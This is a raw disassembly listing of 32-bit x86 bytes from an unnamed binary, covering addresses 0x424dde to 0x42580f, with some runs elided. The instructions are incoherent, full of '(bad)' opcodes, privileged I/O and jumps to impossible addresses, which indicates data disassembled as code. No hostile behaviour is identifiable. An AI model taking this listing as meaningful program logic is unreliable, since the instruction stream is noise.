  424dde:	inc    ecx
  424ddf:	cmp    ebx,DWORD PTR [edi+0x52]
  424de2:	or     eax,eax
  424de4:	cld    
  424de5:	sub    eax,0xf02b394b
  424dea:	add    ch,BYTE PTR [esi+0x66]
  424ded:	mov    esp,0xa43417a7
  424df2:	or     edi,ecx
  424df4:	xchg   edi,eax
  424df5:	adc    DWORD PTR [edi],ebx
  424df7:	aad    0x73
  424df9:	inc    ebp
  424dfa:	mov    ds:0xefb73d1f,eax
  424dff:	stc    
  424e00:	arpl   bx,sp
  424e02:	fisubr DWORD PTR [ecx]
  424e04:	pop    eax
  424e05:	mov    edx,0x9f7db7eb
  424e0a:	pusha  
  424e0b:	xchg   esi,eax
  424e0c:	scas   eax,DWORD PTR es:[edi]
  424e0d:	cmp    bh,0xc6
  424e10:	pop    ds
  424e11:	stos   BYTE PTR es:[edi],al
  424e12:	inc    esp
  424e13:	jle    0x424e3e
  424e15:	aam    0x63
  424e17:	nop
  424e18:	je     0x424e01
  424e1a:	xor    DWORD PTR [esi+0x2d],eax
  424e1d:	push   edx
  424e1e:	loopne 0x424e18
  424e20:	push   ebp
  424e21:	ja     0x424dbd
  424e23:	push   cs
  424e24:	loope  0x424e5d
  424e26:	mov    bl,0x3a
  424e28:	pop    ss
  424e29:	xchg   BYTE PTR [eax],al
  424e2b:	jg     0x424dfa
  424e2d:	(bad)  
  424e2f:	int3   
  424e30:	pop    ebp
  424e31:	mov    eax,ds:0x9975a6a9
  424e36:	loope  0x424e29
  424e38:	icebp  
  424e39:	jo     0x424df1
  424e3b:	push   ebp
  424e3c:	(bad)  
  424e3d:	jecxz  0x424e1e
  424e3f:	mov    dl,0x0
  424e41:	or     DWORD PTR [ebp+eiz*2-0x4],esp
  424e45:	inc    ebx
  424e46:	mov    bl,BYTE PTR [ebp+0x77]
  424e49:	xchg   esp,eax
  424e4a:	sbb    BYTE PTR [eax+0x6e843e9e],ah
  424e50:	ficom  WORD PTR [ecx-0xa6bd306]
  424e56:	cld    
  424e57:	xor    al,0xa1
  424e59:	dec    esp
  424e5a:	push   ebx
  424e5b:	test   esi,eax
  424e5d:	jge    0x424ec0
  424e5f:	mov    eax,ds:0xcc1dcfaa
  424e64:	and    al,0x31
  424e66:	sub    esp,esp
  424e68:	imul   BYTE PTR [eax-0x1d]
  424e6b:	mov    ecx,0xda
	...
  424ed4:	add    BYTE PTR [eax],al
  424ed6:	cmp    eax,0xf361d20c
  424edb:	(bad)  
  424edc:	mov    edi,0x4bceee5c
  424ee1:	jns    0x424e8d
  424ee3:	(bad)  
  424ee4:	outs   dx,BYTE PTR ds:[esi]
  424ee5:	(bad)  
  424ee6:	mov    dl,0x8b
  424ee8:	add    DWORD PTR [eax],eax
  424eea:	inc    DWORD PTR [eax]
  424eec:	add    BYTE PTR [eax],al
  424eee:	pop    edx
  424eef:	das    
  424ef0:	cdq    
  424ef1:	cli    
  424ef2:	(bad)  
  424ef4:	fmul   st,st(3)
  424ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ef7:	or     dl,BYTE PTR [ecx]
  424ef9:	mov    WORD PTR [esi+0x4b],?
  424efc:	adc    al,0x28
  424efe:	out    dx,eax
  424eff:	mov    esp,0x383a4b1e
  424f04:	push   esp
  424f05:	test   BYTE PTR [ecx+0x2fb89db0],0x73
  424f0c:	mov    ah,0xe2
  424f0e:	pop    es
  424f0f:	jge    0x424f6d
  424f11:	sbb    BYTE PTR [edi-0x47],0xdc
  424f15:	mov    dh,0x6b
  424f17:	fmul   DWORD PTR [ebx+esi*2]
  424f1a:	or     ah,BYTE PTR [ebp-0xa895471]
  424f20:	je     0x424f57
  424f22:	sbb    ebx,DWORD PTR [edx+0x555084f7]
  424f28:	push   esi
  424f29:	ds pop edi
  424f2b:	push   0xffffffd2
  424f2d:	mov    ecx,0xdbd15429
  424f32:	scas   eax,DWORD PTR es:[edi]
  424f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424f34:	ins    BYTE PTR es:[edi],dx
  424f35:	jae    0x424f3e
  424f37:	aad    0x82
  424f39:	mov    ecx,0x2f426b73
  424f3e:	xchg   DWORD PTR [ebx],edi
  424f40:	mov    dl,BYTE PTR [esi+0x46d052e7]
  424f46:	pop    edx
  424f47:	sbb    ch,bl
  424f49:	xor    DWORD PTR [ebx-0x46],esp
  424f4c:	std    
  424f4d:	(bad)  
  424f4e:	mov    ds:0x5c19cc4d,al
  424f53:	sub    DWORD PTR [esi+ebp*2],edx
  424f56:	jnp    0x424fa1
  424f58:	sbb    al,cl
  424f5a:	scas   eax,DWORD PTR es:[edi]
  424f5b:	xchg   esi,eax
  424f5c:	jecxz  0x424ef6
  424f5e:	sub    BYTE PTR [edx+edi*8+0x2d],cl
  424f62:	adc    ch,0x6
  424f65:	dec    esi
  424f66:	out    dx,al
  424f67:	dec    ebp
  424f68:	pop    ebx
  424f69:	test   eax,0xaf9592d5
  424f6e:	hlt    
  424f6f:	shr    BYTE PTR [esi+0x3984de55],0xb5
  424f76:	and    eax,0x609b5e53
  424f7b:	inc    edx
  424f7c:	(bad)  
  424f7d:	(bad)  
  424f7e:	or     eax,0x2705570
  424f83:	scas   eax,DWORD PTR es:[edi]
  424f84:	(bad)  
  424f85:	fidivr WORD PTR [ebx+ebx*4+0x4b]
  424f89:	sbb    cl,BYTE PTR [edi+0x7f]
  424f8c:	sbb    DWORD PTR [edx+0x15],edx
  424f8f:	cmovge ecx,edx
  424f92:	push   edx
  424f93:	icebp  
  424f94:	js     0x424f3c
  424f96:	push   edx
  424f97:	icebp  
  424f98:	jb     0x424faa
  424f9a:	and    al,BYTE PTR [edi]
  424f9c:	mov    ebp,0x38b6034e
  424fa1:	les    eax,FWORD PTR [ebx]
  424fa3:	test   ecx,ebp
  424fa5:	pusha  
  424fa6:	(bad)  
  424fa7:	mov    edi,0xde2630c5
  424fac:	in     eax,0xc7
  424fae:	mov    esp,0x109ad040
  424fb3:	jl     0x424f67
  424fb5:	ret    0x7d72
  424fb8:	jae    0x424fca
  424fba:	mov    al,ds:0x48034edf
  424fbf:	xchg   DWORD PTR [ecx+edx*1+0x527dc688],esi
  424fc6:	lds    esi,FWORD PTR [ebx]
  424fc8:	or     eax,DWORD PTR [ecx]
  424fca:	mov    WORD PTR gs:[esi],fs
  424fcd:	jno    0x424f8f
  424fcf:	lahf   
  424fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424fd1:	arpl   WORD PTR [esi+0x53],sp
  424fd4:	dec    esi
  424fd5:	bnd jo 0x424fe0
  424fd8:	and    ebx,esp
  424fda:	push   ss
  424fdb:	pop    esp
  424fdc:	pop    es
  424fdd:	fs pop esi
  424fdf:	sbb    eax,0x774e227c
  424fe4:	mov    edx,0x14836700
  424fe9:	loopne 0x424fe2
  424feb:	jle    0x424fcf
	...
  425055:	add    BYTE PTR [ebx+0x16],cl
  425058:	int    0x41
  42505a:	fstp   st(3)
  42505c:	iret   
  42505d:	push   ds
  42505e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42505f:	fadd   st(3),st
  425061:	dec    eax
  425062:	mov    ecx,0xb13fa820
  425067:	mov    WORD PTR [ecx],es
  425069:	add    bh,bh
  42506b:	add    BYTE PTR [eax],al
  42506d:	add    BYTE PTR [esi-0x23345b92],ah
  425073:	pop    edi
  425074:	stos   BYTE PTR es:[edi],al
  425075:	sbb    dh,dl
  425077:	cmp    eax,0xe1309abc
  42507c:	pop    ebp
  42507d:	arpl   WORD PTR [ebx-0x50],bx
  425080:	xchg   BYTE PTR [edx-0x34],cl
  425083:	push   esp
  425084:	dec    eax
  425085:	cmp    DWORD PTR [ecx],ebp
  425087:	rcl    esp,cl
  425089:	inc    esp
  42508a:	sbb    BYTE PTR [eax],ah
  42508c:	dec    esi
  42508d:	aad    0x5a
  42508f:	mov    al,0x28
  425091:	xchg   edx,eax
  425092:	add    al,ch
  425094:	stos   DWORD PTR es:[edi],eax
  425095:	cmp    dh,BYTE PTR [esp+ebx*1]
  425098:	sbb    eax,eax
  42509a:	sub    al,0xdd
  42509c:	cmp    BYTE PTR ds:0x8871fa5f,ah
  4250a2:	sbb    al,0x9b
  4250a4:	mul    BYTE PTR [ecx-0xa]
  4250a7:	xor    dh,BYTE PTR [edx+0x4d186d45]
  4250ad:	mov    al,ds:0x2ca87e75
  4250b2:	pop    edx
  4250b3:	fnstenv [ebp+0x60]
  4250b6:	push   ebx
  4250b7:	stos   DWORD PTR es:[edi],eax
  4250b8:	stos   BYTE PTR es:[edi],al
  4250b9:	arpl   WORD PTR [ebx-0x57],bx
  4250bc:	bound  edi,QWORD PTR [ebx]
  4250be:	in     eax,0xc3
  4250c0:	mov    ebx,0x9cf35927
  4250c5:	adc    al,0x3a
  4250c7:	jnp    0x4250c6
  4250c9:	pop    ss
  4250ca:	(bad)  
  4250cc:	popa   
  4250cd:	inc    esp
  4250ce:	inc    eax
  4250cf:	out    dx,al
  4250d0:	aaa    
  4250d1:	nop
  4250d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4250d3:	fistp  WORD PTR [edi-0x74]
  4250d6:	stos   DWORD PTR es:[edi],eax
  4250d7:	rol    ch,1
  4250d9:	inc    edi
  4250da:	pushf  
  4250db:	les    ebp,FWORD PTR [ecx+0x7893ee94]
  4250e1:	sbb    BYTE PTR [esi+0x36],ch
  4250e4:	pop    esi
  4250e5:	stos   DWORD PTR es:[edi],eax
  4250e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4250e7:	pushf  
  4250e8:	daa    
  4250e9:	retf   0x8020
  4250ec:	out    dx,eax
  4250ed:	pcmpgtw mm6,mm3
  4250f0:	or     eax,0x84651aab
  4250f5:	add    BYTE PTR [edx-0x7156dc12],0x4e
  4250fc:	add    BYTE PTR [ebx-0x7b924a15],0xdb
  425103:	aas    
  425104:	xor    ecx,DWORD PTR [edx-0x39]
  425107:	mov    ds:0xedd67768,eax
  42510c:	(bad)  
  42510d:	dec    esi
  42510e:	inc    ebx
  42510f:	outs   dx,BYTE PTR ds:[esi]
  425110:	sbb    ch,BYTE PTR [ebx+0xf]
  425113:	enter  0x9afc,0xd2
  425117:	icebp  
  425118:	sub    cl,BYTE PTR [ebp+0x127f3287]
  42511e:	dec    ecx
  42511f:	(bad)  
  425120:	add    DWORD PTR [ecx-0x5df99ed4],ebx
  425126:	push   0x14cc9c27
  42512b:	stos   BYTE PTR es:[edi],al
  42512c:	dec    edx
  42512d:	nop
  42512e:	in     al,dx
  42512f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425130:	icebp  
  425131:	fsub   DWORD PTR [esp+eiz*8]
  425134:	rcr    BYTE PTR [edx-0x2ae41ed0],1
  42513a:	jg     0x4250f8
  42513c:	clc    
  42513d:	ins    DWORD PTR es:[edi],dx
  42513e:	lahf   
  42513f:	jg     0x425184
  425141:	add    eax,0x265c147a
  425146:	jge    0x425142
  425148:	daa    
  425149:	push   edx
  42514a:	cmp    edx,DWORD PTR [eax-0x780bcdd9]
  425150:	pop    ecx
  425151:	(bad)  [ebp+0x6c]
  425154:	mov    ebx,0xde58ad8d
  425159:	dec    edx
  42515a:	rcr    DWORD PTR [edi],1
  42515c:	jmp    0x4251a4
  42515e:	repz jo 0x4250e3
  425161:	gs call 0xfb40:0x4ce3086e
  425169:	(bad)  
  42516a:	jmp    0x4251a4
  42516c:	enter  0x0,0x0
	...
  4251d4:	add    BYTE PTR [eax],al
  4251d6:	ficom  WORD PTR [ecx]
  4251d8:	lahf   
  4251d9:	and    ebx,edi
  4251db:	scas   eax,DWORD PTR es:[edi]
  4251dc:	(bad)  
  4251dd:	std    
  4251de:	out    dx,al
  4251df:	jmp    0x7d1f:0xb7cd92e8
  4251e6:	mov    al,0x8d
  4251e8:	add    DWORD PTR [eax],eax
  4251ea:	inc    DWORD PTR [eax]
  4251ec:	add    BYTE PTR [eax],al
  4251ee:	fdivr  DWORD PTR [edi+eiz*1-0x20]
  4251f2:	fiadd  DWORD PTR [eax+0x40]
  4251f5:	fcomp  DWORD PTR [ebx-0x28]
  4251f8:	jnp    0x42523c
  4251fa:	push   0xffffffea
  4251fc:	mov    ah,0x4c
  4251fe:	pop    ebp
  4251ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425200:	popf   
  425201:	mov    ch,0xe1
  425203:	stos   DWORD PTR es:[edi],eax
  425204:	sbb    ch,BYTE PTR [ebp+0x47a45801]
  42520a:	push   0xffffff98
  42520c:	fdivr  QWORD PTR [edx+0x272aff4c]
  425212:	push   esi
  425213:	sub    bh,al
  425215:	adc    eax,esi
  425217:	fbstp  TBYTE PTR [ebp+0x4304927f]
  42521d:	imul   BYTE PTR [ebx-0x123a25dc]
  425223:	cmp    al,BYTE PTR [ebp-0x64adf47d]
  425229:	movhps xmm3,QWORD PTR [edi]
  42522c:	jl     0x425255
  42522e:	ja     0x425206
  425230:	push   esp
  425231:	data16 fistp QWORD PTR [esi]
  425234:	cmp    BYTE PTR [esi+ebx*4+0x33382304],bl
  42523b:	scas   al,BYTE PTR es:[edi]
  42523c:	das    
  42523d:	mov    esp,0xec62182a
  425242:	test   DWORD PTR ds:0x61095f50,ebx
  425248:	sub    DWORD PTR [eax+0x6a244e2c],esi
  42524e:	ret    
  42524f:	add    eax,0x44c7b61c
  425254:	ins    BYTE PTR es:[edi],dx
  425255:	push   esp
  425256:	and    al,0x68
  425258:	rcl    bl,1
  42525a:	fcom   DWORD PTR [edx-0x5712a922]
  425260:	out    dx,al
  425261:	iret   
  425262:	int    0xe8
  425264:	dec    esi
  425265:	mov    bh,0xa1
  425267:	daa    
  425268:	dec    esp
  425269:	sub    edx,DWORD PTR [ecx-0x322d0f20]
  42526f:	or     BYTE PTR [edi-0x31608b9e],al
  425275:	jbe    0x4252d5
  425277:	mov    eax,ds:0xa2faa72e
  42527c:	push   esi
  42527d:	mov    edi,0x86fc1cae
  425282:	not    edx
  425284:	fst    QWORD PTR [ecx-0x65fc88a8]
  42528a:	les    esi,FWORD PTR [ecx+0x5]
  42528d:	shr    BYTE PTR [esi],0x70
  425290:	data16 add bl,BYTE PTR [esi]
  425293:	div    DWORD PTR [eax+eiz*1-0x35]
  425297:	xor    ecx,ecx
  425299:	das    
  42529a:	div    DWORD PTR [ebp+0xe]
  42529d:	cmp    al,0xb9
  42529f:	cmp    dh,BYTE PTR [ecx-0x7f]
  4252a2:	mov    eax,0xd270e131
  4252a7:	inc    ecx
  4252a8:	dec    edx
  4252a9:	sub    al,0x87
  4252ab:	sub    dh,cl
  4252ad:	jo     0x4252ed
  4252af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252b0:	ficom  DWORD PTR [ebx-0x45caf11d]
  4252b6:	cwde   
  4252b7:	xchg   DWORD PTR [edx+0x3a],esi
  4252ba:	add    eax,0x6502774c
  4252bf:	frstor [esi+0x3b0b6707]
  4252c5:	sub    al,BYTE PTR [edx]
  4252c7:	sbb    DWORD PTR [ecx-0x2fe08d96],ebp
  4252cd:	gs lahf 
  4252cf:	jmp    0x5fda69a
  4252d4:	fisttp QWORD PTR [ebp+0x7e]
  4252d7:	aas    
  4252d8:	cwde   
  4252d9:	mov    eax,ds:0x22a36a1b
  4252de:	mov    eax,ds:0x69832eb7
  4252e3:	xor    DWORD PTR [eax],esi
  4252e5:	daa    
  4252e6:	(bad)  
  4252e8:	sub    BYTE PTR [ecx+0x12197b],0x0
	...
  425353:	add    BYTE PTR [eax],al
  425355:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42535c:	mov    ebp,0x45495ee6
  425361:	icebp  
  425362:	push   ecx
  425363:	ss sub al,0xea
  425366:	scas   eax,DWORD PTR es:[edi]
  425367:	mov    es,WORD PTR [ecx]
  425369:	add    bh,bh
  42536b:	add    BYTE PTR [eax],al
  42536d:	add    BYTE PTR [esi+0x28],bl
  425370:	imul   edi,DWORD PTR [ebx+0x15],0xcc9b50a0
  425377:	call   esp
  425379:	and    edi,edi
  42537b:	xchg   ebx,eax
  42537c:	mov    al,ds:0xcfc574e8
  425381:	push   esi
  425382:	jmp    0xcbba0a9b
  425387:	daa    
  425388:	in     eax,0x97
  42538a:	les    edx,FWORD PTR [bp+0x2ee3]
  42538f:	xchg   DWORD PTR [edx-0x2a],edi
  425392:	pop    esi
  425393:	jne    0x4253c8
  425395:	lods   eax,DWORD PTR ds:[esi]
  425396:	mov    BYTE PTR [ebp+0x4c],ch
  425399:	mov    eax,ds:0xe12333c4
  42539e:	mov    esi,0xc15407d5
  4253a3:	cmp    eax,0xb5abebb8
  4253a8:	jmp    0x425399
  4253aa:	scas   eax,DWORD PTR es:[edi]
  4253ab:	call   0x430d08f9
  4253b0:	adc    dl,ch
  4253b2:	jmp    0x42535e
  4253b4:	sbb    ebp,ecx
  4253b6:	mov    cl,BYTE PTR [ebx+esi*8]
  4253b9:	xchg   esi,eax
  4253ba:	icebp  
  4253bb:	hlt    
  4253bc:	mov    bl,0xbb
  4253be:	mov    eax,ds:0x63f60c93
  4253c3:	xchg   ebp,eax
  4253c4:	dec    ecx
  4253c5:	mov    ebp,DWORD PTR [esi+0x5c703ba3]
  4253cb:	or     eax,0xd3b32b9
  4253d0:	imul   ebx,ecx,0xb41dd309
  4253d6:	inc    ebp
  4253d7:	mov    esp,0xc29d818a
  4253dc:	ins    DWORD PTR es:[edi],dx
  4253dd:	jno    0x425411
  4253df:	mov    ah,0x77
  4253e1:	call   0x23468bb2
  4253e6:	pop    es
  4253e7:	add    ecx,DWORD PTR [ebx]
  4253e9:	cmp    dl,BYTE PTR [esi-0x4b]
  4253ec:	jae    0x42537b
  4253ee:	push   0x54
  4253f0:	sbb    DWORD PTR [edi],esp
  4253f2:	mov    al,0xc7
  4253f4:	aad    0xd
  4253f6:	push   edx
  4253f7:	retf   0xa297
  4253fa:	or     DWORD PTR [edx-0x7d],esi
  4253fd:	add    ebx,edi
  4253ff:	test   al,0xb
  425401:	mov    al,0x8a
  425403:	shr    BYTE PTR [eax+0xd],1
  425406:	mov    bl,0xf0
  425408:	fist   DWORD PTR [ebp+0x4c]
  42540b:	pop    ebx
  42540c:	loopne 0x4253d0
  42540e:	sub    BYTE PTR [edi+0x3a],dl
  425411:	mov    ss,WORD PTR [eax+0x6818420c]
  425417:	adc    DWORD PTR [di],edx
  42541a:	test   al,0x34
  42541c:	push   ebp
  42541d:	push   esp
  42541e:	jp     0x42546c
  425420:	xor    edx,DWORD PTR [ecx+ecx*8-0x7d]
  425424:	inc    eax
  425425:	xor    al,0xaf
  425427:	push   esi
  425428:	cld    
  425429:	sbb    ecx,DWORD PTR [ecx]
  42542b:	aaa    
  42542c:	add    al,0x5
  42542e:	jnp    0x42542e
  425430:	dec    eax
  425431:	daa    
  425432:	cwde   
  425433:	mov    ebp,DWORD PTR [ebp-0x65]
  425436:	pop    ecx
  425437:	test   DWORD PTR [ecx],0x5b94defc
  42543d:	dec    ebx
  42543e:	sti    
  42543f:	add    DWORD PTR [ebx],esi
  425441:	inc    ecx
  425442:	stos   DWORD PTR es:[edi],eax
  425443:	inc    ebp
  425444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425446:	(bad)
  425449:	test   DWORD PTR ds:0x517fa8c0,ebx
  42544f:	adc    edi,DWORD PTR [edx-0x15f3bd51]
  425455:	ror    BYTE PTR ds:0xd6f57fc5,1
  42545b:	jo     0x42544c
  42545d:	add    ebp,DWORD PTR [edi-0x4a6f0029]
  425463:	retf   
  425464:	adc    bh,ch
  425466:	xchg   ebp,eax
  425467:	inc    esp
  425468:	mov    ebp,0xa02bb933
	...
  4254d5:	add    BYTE PTR [edx+0x9],al
  4254d8:	les    ebp,FWORD PTR [ecx-0x14901231]
  4254de:	fcomp  DWORD PTR [edx]
  4254e1:	add    ecx,DWORD PTR [edx-0x28]
  4254e4:	mov    dh,0xd9
  4254e6:	scas   al,BYTE PTR es:[edi]
  4254e7:	pop    DWORD PTR [ecx]
  4254e9:	add    bh,bh
  4254eb:	add    BYTE PTR [eax],al
  4254ed:	add    BYTE PTR [esi],cl
  4254ef:	leave  
  4254f0:	inc    eax
  4254f1:	stos   BYTE PTR es:[edi],al
  4254f2:	mov    dl,0xb4
  4254f4:	loopne 0x425511
  4254f6:	mov    DWORD PTR [edx+0x66],esi
  4254f9:	into   
  4254fa:	sub    edi,DWORD PTR [eax]
  4254fc:	(bad)  
  4254fd:	int    0x88
  4254ff:	pusha  
  425500:	pop    esi
  425501:	repz dec edx
  425503:	xor    esi,ebp
  425505:	lds    esi,FWORD PTR [esi]
  425507:	aaa    
  425508:	inc    ebx
  425509:	retf   
  42550a:	outs   dx,BYTE PTR ds:[esi]
  42550b:	push   ecx
  42550c:	dec    edi
  42550d:	imul   ebx,DWORD PTR [esi+0x6ce2f099],0x6dac46f3
  425517:	outs   dx,DWORD PTR ds:[esi]
  425518:	ror    ecx,1
  42551a:	lea    ebx,[eax+0x41]
  42551d:	popf   
  42551e:	sbb    esi,DWORD PTR [ebx]
  425520:	ss mov esi,0xc0bbe2ac
  425526:	aaa    
  425527:	imul   edx,DWORD PTR [ebx-0x10],0xffffffdc
  42552b:	mov    al,0xec
  42552d:	lods   al,BYTE PTR ds:[esi]
  42552e:	call   0xee282218
  425533:	xor    BYTE PTR [edx],0x22
  425536:	js     0x4254ce
  425538:	dec    edx
  425539:	ret    
  42553a:	fmul   st(2),st
  42553c:	idiv   BYTE PTR [ecx-0x43]
  42553f:	adc    dh,BYTE PTR [edi+ebx*8]
  425542:	mov    dh,0x97
  425544:	leave  
  425545:	sar    BYTE PTR [edx],1
  425547:	adc    edi,DWORD PTR [eax-0x537197ce]
  42554d:	and    al,0xff
  42554f:	add    BYTE PTR ds:0x2acef817,0x62
  425556:	int3   
  425557:	sahf   
  425558:	outs   dx,BYTE PTR ds:[esi]
  425559:	sbb    eax,DWORD PTR [esi-0x79]
  42555c:	std    
  42555d:	lahf   
  42555e:	std    
  42555f:	addr16 std 
  425561:	xchg   DWORD PTR [eax-0x5de27834],eax
  425567:	sub    DWORD PTR [ebx+edi*1+0x2f9b266f],ecx
  42556e:	dec    ebx
  42556f:	mov    cl,0x51
  425571:	adc    al,0x1b
  425573:	aaa    
  425574:	xlat   BYTE PTR ds:[ebx]
  425575:	or     ch,bh
  425577:	test   eax,0xf4445c98
  42557c:	xchg   DWORD PTR [eax+0x5d4ad9f1],ecx
  425582:	add    bl,BYTE PTR [edi+ebp*8-0x750b1cd9]
  425589:	adc    al,0x99
  42558b:	jmp    0x4255ac
  42558d:	or     al,0xd0
  42558f:	cmp    ch,BYTE PTR [ecx-0x45]
  425592:	push   0x725b4eee
  425597:	sub    ebx,DWORD PTR [ebp-0x26839b2c]
  42559d:	sbb    eax,0xd645a41f
  4255a2:	cmp    al,0x5d
  4255a4:	imul   edi
  4255a6:	(bad)  
  4255a7:	cmp    al,0x41
  4255a9:	(bad)  
  4255aa:	xchg   esp,eax
  4255ab:	stos   DWORD PTR es:[edi],eax
  4255ac:	rol    BYTE PTR [ebp+0x33],0xf4
  4255b0:	or     DWORD PTR [esi-0xc],ebp
  4255b3:	sub    esi,DWORD PTR [ebx]
  4255b5:	aaa    
  4255b6:	out    0x89,eax
  4255b8:	add    BYTE PTR [eax],al
  4255ba:	gs div esi
  4255bd:	mov    esi,0x8718a7c1
  4255c2:	mov    eax,0x342ea3b0
  4255c7:	int3   
  4255c8:	sti    
  4255c9:	out    0x10,eax
  4255cb:	ret    
  4255cc:	adc    DWORD PTR [eax],eax
  4255ce:	adc    DWORD PTR [ebx-0x63],edi
  4255d1:	daa    
  4255d2:	inc    ebx
  4255d3:	inc    ebp
  4255d4:	sbb    DWORD PTR [esi+ebx*1],esi
  4255d7:	push   edi
  4255d8:	jle    0x42561c
  4255da:	push   edi
  4255db:	mov    ecx,0x59308d93
  4255e0:	jne    0x425642
  4255e2:	adc    ebp,esp
  4255e4:	push   ss
  4255e5:	push   esp
  4255e6:	(bad)  
  4255e7:	push   0x6e069052
  4255ec:	outs   dx,BYTE PTR ds:[esi]
	...
  425655:	add    ah,al
  425657:	jmp    0xfef4:0xfe6e7a4e
  42565e:	dec    ebp
  42565f:	mov    esi,0xa059f13a
  425664:	xor    DWORD PTR [eax],0x190ad
  42566a:	inc    DWORD PTR [eax]
  42566c:	add    BYTE PTR [eax],al
  42566e:	clc    
  42566f:	pop    ecx
  425670:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  425672:	push   esp
  425673:	mov    cl,ah
  425675:	pop    edi
  425676:	mov    WORD PTR [ebx+ecx*4-0x4c34531c],?
  42567d:	sub    DWORD PTR [edi+0x56765fbd],0x7f
  425684:	xchg   esi,eax
  425685:	mov    esi,0x997ace04
  42568a:	sub    eax,DWORD PTR [ebx-0x69]
  42568d:	mov    al,gs:0xbb3f825d
  425693:	xchg   edi,eax
  425694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425696:	and    BYTE PTR [ecx],bh
  425698:	out    dx,eax
  425699:	and    esp,DWORD PTR [ecx-0x3e]
  42569c:	push   esi
  42569d:	lods   al,BYTE PTR ds:[esi]
  42569e:	add    ebp,DWORD PTR [eax+0x3e]
  4256a1:	in     al,0x8d
  4256a3:	or     cl,BYTE PTR [ecx-0x5f8bcf4a]
  4256a9:	adc    ax,0xcd89
  4256ad:	mov    ecx,0xcfbd0ba9
  4256b2:	push   ebp
  4256b3:	xor    edx,DWORD PTR [edx-0x14]
  4256b6:	add    al,0xe5
  4256b8:	push   ebp
  4256b9:	ins    BYTE PTR es:[edi],dx
  4256ba:	les    ecx,FWORD PTR [esi]
  4256bc:	loopne 0x4256ad
  4256be:	push   0xffffffe5
  4256c0:	sbb    esi,DWORD PTR [eax+0x5db2e5ba]
  4256c6:	mov    dh,0xe3
  4256c8:	mov    ?,WORD PTR [edi-0xb]
  4256cb:	ja     0x4256bb
  4256cd:	loope  0x425661
  4256cf:	push   cs
  4256d0:	repnz das 
  4256d2:	cmp    dl,0xbd
  4256d5:	(bad)  
  4256d6:	ficom  DWORD PTR [edi+0x3d865665]
  4256dc:	ja     0x4256c5
  4256de:	dec    esi
  4256df:	dec    eax
  4256e0:	jae    0x4256ae
  4256e2:	cmc    
  4256e3:	inc    ebx
  4256e4:	std    
  4256e5:	ins    DWORD PTR es:[edi],dx
  4256e6:	xchg   BYTE PTR [esi],dh
  4256e8:	jl     0x4256f9
  4256ea:	and    eax,0x845d25d7
  4256ef:	sub    eax,0x8f2c2443
  4256f4:	add    DWORD PTR [ebx+0x4c],edx
  4256f7:	fdiv   QWORD PTR [eax+ebp*1+0x4a796171]
  4256fe:	retf   
  4256ff:	(bad)  
  425701:	ins    DWORD PTR es:[edi],dx
  425702:	mov    DWORD PTR [edx-0x17],ecx
  425705:	pop    esi
  425706:	arpl   WORD PTR [ebx+ebx*8+0x77],dx
  42570a:	xchg   esp,eax
  42570b:	gs inc eax
  42570d:	out    0x64,eax
  42570f:	xchg   edi,eax
  425710:	(bad)  
  425711:	ins    BYTE PTR es:[edi],dx
  425712:	mov    dl,ch
  425714:	adc    DWORD PTR [ebx-0x79304ae7],ebx
  42571a:	mov    ah,0x59
  42571c:	(bad)  
  42571d:	pop    edi
  42571e:	xchg   edi,eax
  42571f:	add    ah,BYTE PTR [eax-0x763e3e2e]
  425725:	arpl   si,di
  425727:	retf   
  425728:	imul   esp,DWORD PTR [esi-0x63427a3d],0xcf907d11
  425732:	sub    DWORD PTR [ecx+ecx*1],esi
  425735:	dec    ebp
  425736:	(bad)  
  425737:	call   DWORD PTR [esp+ebx*4]
  42573a:	dec    edi
  42573b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42573c:	lds    esp,FWORD PTR [ebp+0x13]
  42573f:	data16 hlt 
  425741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425742:	int3   
  425743:	idiv   DWORD PTR [ebx+0x48a47c90]
  425749:	ret    
  42574a:	dec    esi
  42574b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42574c:	jg     0x4257b3
  42574e:	popa   
  42574f:	pop    esp
  425750:	stos   BYTE PTR es:[edi],al
  425751:	data16 mov bh,0x8b
  425754:	and    BYTE PTR [eax-0x2d598811],al
  42575a:	dec    ebp
  42575b:	or     BYTE PTR [edx+0x6b],dl
  42575e:	jmp    0x425779
  425760:	jnp    0x425756
  425762:	daa    
  425763:	and    eax,0xfd84a8c5
  425768:	jb     0x4257d5
  42576a:	int    0x4
  42576c:	cli    
	...
  4257d5:	add    dh,dl
  4257d7:	aaa    
  4257d8:	shl    BYTE PTR [ebx+esi*8],cl
  4257db:	cmc    
  4257dc:	div    bh
  4257de:	test   DWORD PTR [edi+0x3f],0xf86b4974
  4257e5:	push   eax
  4257e6:	lods   al,BYTE PTR ds:[esi]
  4257e7:	xchg   ecx,eax
  4257e8:	add    DWORD PTR [eax],eax
  4257ea:	inc    DWORD PTR [eax]
  4257ec:	add    BYTE PTR [eax],al
  4257ee:	mov    ecx,DWORD PTR [esi+0x76]
  4257f1:	sub    bh,BYTE PTR [ecx+0x7d]
  4257f4:	xchg   ebp,eax
  4257f5:	and    BYTE PTR [ecx],bl
  4257f7:	xor    al,0xf2
  4257f9:	or     DWORD PTR [esi+eax*1],0xff7f0761
  425800:	imul   esi,DWORD PTR [eax-0x25],0xffffff9f
  425804:	bswap  eax
  425806:	xchg   esp,eax
  425807:	aas    
  425808:	adc    al,0x87
  42580a:	adc    esp,ebx
  42580c:	and    dl,0xf5
  42580f:	test   BYTE PTR [ebp-0x29],ah
